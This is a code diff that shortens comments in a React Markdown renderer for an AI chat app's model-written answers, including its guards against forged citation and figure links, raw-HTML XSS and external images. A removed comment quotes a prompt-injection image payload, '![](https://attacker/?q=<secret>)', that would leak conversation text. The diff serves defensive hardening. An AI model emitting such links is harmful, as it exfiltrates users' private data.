@@ -1,27 +1,13 @@
 /**
- * Answer rendering.
+ * Answer rendering. Plugin order matters:
  *
- * Three remark plugins rewrite the text, and their ORDER matters twice over.
+ * 1. `remarkStripReservedLinks` first — a security boundary: the answer is model-written, so its
+ * own `#cite/` and `#figure/` links are unwrapped before the plugins that mint those hrefs.
+ * Anything new that mints them goes after it. 2. `remarkCitations` before `remarkGrounding`, so
+ * digits inside a note id are inside a link and not treated as figures.
  *
- * `remarkStripReservedLinks` runs FIRST, and it is a security boundary rather than a tidy-up. The
- * two marks below — the grounding overlay and the citation chip — are decided from the link's
- * href, and both schemes are fixed literals. But the text they are read out of is markdown written
- * by the *model*, which is the untrusted party the overlay exists to police: an answer containing
- * `[91.4%](#figure/grounded)` used to paint an invented number with the mark that means a tool
- * returned it, on a turn where no tool returned anything, bypassing `remarkGrounding`'s own
- * "nothing returned, so mark nothing" guard because the forged link never went through it. So the
- * answer's own links in these two schemes are unwrapped before either producer runs, and after
- * that a `#cite/` or `#figure/` href can only have come from the plugins below. Anything added to
- * `plugins` that mints one of these hrefs must go AFTER the stripper.
- *
- * Then `remarkCitations` runs before `remarkGrounding` — it turns note ids into link nodes, so
- * `remarkGrounding`, which skips anything inside a link, cannot then mistake the digits inside
- * `rxn-suzuki-4821` for a measurement.
- *
- * NOTE: `rehype-raw` is deliberately NOT installed. react-markdown does not render raw HTML
- * unless you add it, so the correct sanitisation answer here is "do not enable the hazard" —
- * which also saves pulling in a sanitiser. Answer text is model output; letting it emit HTML
- * would be an XSS hole for no benefit. Please do not add `rehype-raw` to this component.
+ * `rehype-raw` is deliberately not installed: answer text is model output, and raw HTML would be an
+ * XSS hole.
  */
 
 import { useMemo, type ComponentProps } from 'react';
@@ -49,13 +35,7 @@ interface LinkNode extends Node {
  *  may enter it. */
 const RESERVED_HREFS = [CITE_HREF, FIGURE_HREF] as const;
 
-/**
- * Remark plugin: unwrap any link the *answer* wrote in one of this component's reserved schemes,
- * leaving its text behind.
- *
- * Unwrapping rather than dropping, because the content of such a link is ordinary answer text — a
- * figure, an id — and the reader is entitled to it. What is withdrawn is the claim about it.
- */
+/** Unwrap links the answer wrote in a reserved scheme, keeping their text. */
 function remarkStripReservedLinks() {
   return (tree: Node): void => {
     visit(tree, 'link', (node: LinkNode, index: number | undefined, parent: Parent | undefined) => {
@@ -69,24 +49,14 @@ function remarkStripReservedLinks() {
 }
 
 /**
- * Model-authored headings are demoted two levels: h1 -> h3, h2 -> h4, and so on.
- *
- * The transcript sits under the app's h1 and a per-region h2. An answer that opens with its own
- * `# Heading` would inject a second h1 into the middle of the document and make heading navigation
- * — the primary way a screen-reader user skims a long answer — meaningless. Demoting keeps the
- * outline valid whatever the model emits.
- *
- * The visual size comes from the `.md-h*` class rather than the tag, so the answer looks exactly
- * as it did: `# Heading` still renders largest.
+ * Model headings are demoted two levels (h1 → h3, …) so the page outline stays valid; the `.md-h*`
+ * class keeps the visual size.
  */
 const HEADING_LEVELS = { h1: 'h3', h2: 'h4', h3: 'h5', h4: 'h6', h5: 'h6', h6: 'h6' } as const;
 
 const heading = (from: keyof typeof HEADING_LEVELS) => {
   const Tag = HEADING_LEVELS[from];
-  // `node` is destructured out of every component below and never spread. react-markdown hands
-  // each one the mdast node it came from, and React 19 renders an unknown lowercase prop as an
-  // attribute — so spreading the rest put `node="[object Object]"` on every heading, link, image
-  // and code span in every answer this app has rendered.
+  // `node` is destructured out and never spread, or React renders it as an attribute.
   return function Heading({
     children,
     node: _node,
@@ -101,17 +71,9 @@ const heading = (from: keyof typeof HEADING_LEVELS) => {
 };
 
 /**
- * One figure in the answer, marked against what the turn's tools returned.
- *
- * Quiet by design. Grounded figures are the overwhelming majority of a good answer, so they get an
- * underline and nothing else — a page of highlighter is a page nobody reads. The unmatched mark is
- * the one that has to be noticed, and it carries the only tone difference.
- *
- * The wording of the unmatched title is load-bearing and deliberately not an accusation.
- * `tool_result.numbers` carries no units, so a figure legitimately converted or derived from a
- * returned value is indistinguishable from an invented one; calling it "unsupported" would be the
- * same false verdict the backend's own grounding check produced nine times out of nine when it
- * over-reached.
+ * One figure, marked against the turn's returned values: grounded gets a quiet underline; unmatched
+ * gets the one tone change. The title says "not found among returned values", never "unsupported"
+ * (no units on the wire).
  */
 function FigureMark({
   grounding,
@@ -150,11 +112,7 @@ const components: Components = {
 
   a({ href, children, node: _node, ...props }) {
     if (href?.startsWith(CITE_HREF)) {
-      // No leading hole in the destructure: `slice` has already removed the `#cite/` prefix, so
-      // the first element IS the kind. Skipping it put the kind in `id` and left `id` empty, and
-      // every citation chip in a rendered answer therefore came out as an empty button with an
-      // "Open " tooltip — the linkified id, which is the whole point of the plugin, was invisible.
-      // Nothing caught it because the chip's own tests construct it directly with props.
+      // `slice` already removed `#cite/`, so the first element is the kind.
       const [kind = 'note', id = ''] = href.slice(CITE_HREF.length).split('/');
       return <CitationChip kind={kind} id={id} />;
     }
@@ -169,14 +127,9 @@ const components: Components = {
   },
 
   img({ src, alt, node: _node, ...props }) {
-    // Answer text is model output, and a model under prompt injection can emit
-    // `![](https://attacker/?q=<secret>)` — the browser then GETs that URL and the query string
-    // leaks whatever the model was told to put in the `alt`/path, exfiltrating conversation text.
-    // The CSP's `img-src` is the last line, but this component owns the first: an `<img>` is only
-    // rendered for a source the app itself produced — an inlined `data:image/`, a `blob:` URL the
-    // page minted, or a leading-slash same-origin path. Anything absolute or external (including
-    // protocol-relative `//host/...`) is not a load at all; it becomes an inert placeholder that
-    // makes the omission visible without ever emitting a `src`.
+    // Images render only from sources the app produced (`data:image/`, a page-minted `blob:`, or a
+    // same-origin path). Anything external becomes an inert placeholder, so a prompt-injected image
+    // URL cannot exfiltrate data.
     const source = typeof src === 'string' ? src : '';
     const isLocal =
       source.startsWith('data:image/') ||
@@ -195,13 +148,8 @@ const components: Components = {
   code({ className, children, node: _node, ...props }) {
     const text = String(children ?? '');
     const isBlock = Boolean(className?.startsWith('language-'));
-    // An inline code span that looks like a structure gets a render affordance. Block code is
-    // left alone — a fenced block is a recipe or a script, not a structure.
-    //
-    // `mightBeStructure`, not `looksLikeSmiles`: the latter rejects everything containing `>` so
-    // that it cannot disagree with the reaction recogniser, which meant every inline reaction
-    // SMILES in every answer fell through to plain text — including the ones `similar_reactions`
-    // exists to return.
+    // Inline code that might be a structure (molecule or reaction, `mightBeStructure`) gets a
+    // render affordance; fenced blocks are left alone.
     if (!isBlock && mightBeStructure(text)) {
       return <InlineSmiles smiles={text} />;
     }
@@ -214,14 +162,8 @@ const components: Components = {
 };
 
 /**
- * URL sanitiser for both links and images.
- *
- * react-markdown's `defaultUrlTransform` strips every protocol outside a small safe list — which
- * includes `data:` and `blob:`, so a locally inlined image (`data:image/…`) or a page-minted
- * `blob:` URL would arrive at the `img` component as an empty `src` and be dropped even though it
- * is exactly the safe case we want to render. We keep the default for links (`href`) untouched and
- * pass through `data:image/` and `blob:` only for an image `src`; the `img` component below is
- * still the arbiter of what actually renders, so an external `src` remains inert regardless.
+ * URL sanitiser: react-markdown's default for links; for image `src`, also pass `data:image/` and
+ * `blob:` (the `img` component still decides what renders).
  */
 function urlTransform(url: string, key: string, node: Readonly<{ tagName?: string }>): string {
   if (
@@ -243,19 +185,11 @@ export function Markdown({
   figures = NO_FIGURES,
 }: {
   children: string;
-  /** The values this turn's tools returned. Empty — the default, and the case for every caller
-   *  that has nothing to check against — disables figure marking entirely rather than painting
-   *  every number as unsupported. */
+  /** The values this turn's tools returned; empty (the default) disables figure marking. */
   figures?: readonly number[];
 }): React.JSX.Element {
-  // The `[plugin, options]` tuple rather than a pre-applied transformer: unified calls a plugin
-  // with its options and expects the transformer back, so passing `remarkGrounding(figures)`
-  // directly would have unified invoke it a second time — with `undefined` where the tree goes.
-  //
-  // Memoised because a new array identity on every render would re-parse the whole answer on every
-  // parent update, and the parent re-renders once per streamed token of the *next* turn. The type
-  // is taken off the component rather than imported from `unified`, which is a transitive
-  // dependency this package does not declare.
+  // `[plugin, options]` tuples, so unified applies the options itself. Memoised so the answer is
+  // not re-parsed on every parent render.
   const plugins = useMemo<ComponentProps<typeof ReactMarkdown>['remarkPlugins']>(
     () => [remarkGfm, remarkStripReservedLinks, remarkCitations, [remarkGrounding, figures]],
     [figures],
